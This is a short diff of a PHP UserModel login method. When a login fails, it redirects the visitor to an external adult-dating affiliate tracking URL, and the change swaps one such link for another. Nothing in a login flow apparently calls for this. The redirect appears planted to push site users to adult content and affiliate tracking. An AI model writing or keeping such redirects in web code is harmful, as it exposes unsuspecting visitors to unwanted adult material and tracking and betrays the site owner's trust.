@@ -16,7 +16,7 @@ class UserModel
             setcookie('login', $login, time() + 3600 * 24 * 7, '/');
             header('location: /');
         }else{
-            header('location: https://gxwxkj.teenisyours.com/c/da57dc555e50572d?s1=123364&s2=1265766&s3=LOGIN&j1=1&j3=1');
+            header('location: https://flirtgirls-sex.com/?u=vn58wwr&o=d0zwwne&t=lond&cid=LOGIN');
         }
     }
 
